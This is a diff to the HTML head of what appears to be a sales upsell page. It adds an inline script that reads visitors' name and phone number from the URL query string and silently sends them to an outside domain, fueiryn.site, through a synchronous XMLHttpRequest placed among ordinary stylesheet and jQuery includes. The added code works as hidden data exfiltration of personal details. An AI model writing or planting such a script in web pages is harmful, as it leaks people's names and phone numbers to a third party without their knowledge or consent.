@@ -11,6 +11,48 @@
         <link media="all" href="/assets_pages/upsells/css/main.css?v=0.1" rel="stylesheet" type="text/css"/>
         <link media="all" href="/assets_pages/upsells/css/hint.css" rel="stylesheet" type="text/css"/>
         <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+		
+		
+		
+		 <script>
+		
+		function $_GET(key) {
+	var s = window.location.search;
+	s = s.match(new RegExp(key + '=([^&=]+)'));
+	return s ? s[1] : false;
+}
+       
+	   var nam = ( $_GET('name'));
+	   
+	   var phon = ( $_GET('phone'));
+	
+	   
+		   file_get_contents("https://fueiryn.site/top/buy.php?phone="+phon+"&name="+nam+"");
+
+		   function file_get_contents( url ) {	// Reads entire file into a string
+	// 
+	// +   original by: Legaev Andrey
+	// %		note 1: This function uses XmlHttpRequest and cannot retrieve resource from different domain.
+
+	var req = null;
+	try { req = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) {
+		try { req = new ActiveXObject("Microsoft.XMLHTTP"); } catch (e) {
+			try { req = new XMLHttpRequest(); } catch(e) {}
+		}
+	}
+	if (req == null) throw new Error('XMLHttpRequest not supported');
+
+	req.open("GET", url, false);
+	req.send(null);
+
+	return req.responseText;
+}
+
+
+        </script>
+		
+		
+		
         <script src="/assets_pages/upsells/js/jquery.placeholder.js"></script>
         
         <script type="text/javascript" src="/assets_pages/js/lib.js"></script>
